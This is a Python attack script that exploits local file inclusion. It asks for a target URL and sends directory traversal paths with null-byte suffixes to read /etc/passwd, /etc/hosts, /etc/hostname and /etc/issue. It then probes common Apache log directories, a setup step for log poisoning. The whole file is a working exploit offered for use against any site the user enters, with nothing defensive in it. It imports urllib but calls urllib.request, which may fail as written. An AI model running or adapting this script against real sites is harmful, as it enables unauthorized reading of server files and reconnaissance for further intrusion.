#!/usr/bin/python
import urllib
import time

def lfi():
	print("Make sure to include https or http!")
	print("Example: https://www.example.com/vulnerable.php?")
	host = input("Host to perform LFI: ")
	final_host = f"{host}page=../../../../../../../../"
	path = list(("/etc/passwd%00", "/etc/hosts%00"))
	path.append("/etc/hostname%00")
	path.append("/etc/issue%00")

	for i in path:
		print("-" * 200)
		print(i)
		print("-" * 200)
		print(urllib.request.urlopen(final_host + i).read())
	
def check_log():
	print("Make sure to include https or http!")
	print("Example: https://www.example.com/vulnerable.php?")
	host = input("Host to perform LFI: ")
	final_host = f"{host}page=../../../../../../../../"
	path = list(("/apache/logs/", "/etc/httpd/logs/"))
	path.append("/var/log/")
	path.append("/var/www/logs/")
	path.append("/usr/local/apache/logs/")

	for i in path:
		print("-" * 200)
		print(i)
		print("-" * 200)
		print(urllib.request.urlopen(final_host + i).read())

choice = input("Do you want to check for Apache Logs: ").lower().strip()
if choice == "y":
	start_time = time.time()
	lfi()
	print("-" * 200)
	print("\n\n\n")
	time.sleep(2)
	check_log()
	print("Execution Time: %s" % (time.time() - start_time - 2))
else:
	start_time = time.time()
	lfi()
	print("Execution Time: %s" % (time.time() - start_time))